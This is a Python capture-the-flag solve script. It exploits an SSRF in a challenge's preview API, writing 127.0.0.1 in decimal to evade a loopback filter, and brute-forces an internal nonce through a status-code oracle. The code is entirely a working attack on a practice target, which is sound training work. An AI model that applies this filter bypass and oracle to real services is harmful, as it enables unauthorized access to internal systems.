#!/usr/bin/env python3
import requests, sys
from pwn import log

# Configuración
ENDPOINT     = "https://pointeroverflowctf.com/challenges/the-logic-inside/_app/api/preview"
COOKIE       = "session=... cookie de session ..."
SSRF_HOST    = "2130706433"       # 127.0.0.1 en decimal — bypassea el filtro
URL_KEY      = "url"              # clave del body
STATUS_FIELD = "upstream_status"  # status de la respuesta

HEADERS = {"Cookie": COOKIE, "Content-Type": "application/json"}
HEX = "0123456789abcdef"

def check_char(prefix: str) -> int:
    target = f"http://{SSRF_HOST}:9001/flag?guess={prefix}"
    try:
        r = requests.post(ENDPOINT, json={URL_KEY: target}, headers=HEADERS, timeout=10)
        return r.json().get(STATUS_FIELD)
    except Exception:
        return None

def obtain_nonce() -> str:
    nonce = ""
    p = log.progress("Buscando nonce")
    
    for pos in range(16):
        found = False
        for c in HEX:
            current_guess = nonce + c

            # Barra de progreso.
            p.status(f"Posición {pos:2d}/15 | Probando: {current_guess}")
            
            if check_char(current_guess) == 200:
                nonce += c
                found = True
                break
        
        if not found:
            p.failure(f"No se encontró el nonce.")
            sys.exit(1)
            
    p.success(f"Completado.")
    return nonce

if __name__ == "__main__":
    log.info("Buscando nonce.")
    nonce = obtain_nonce()
    
    log.success(f"Nonce: {nonce}")
    log.success(f"Flag: POCTF{{{nonce}}}")

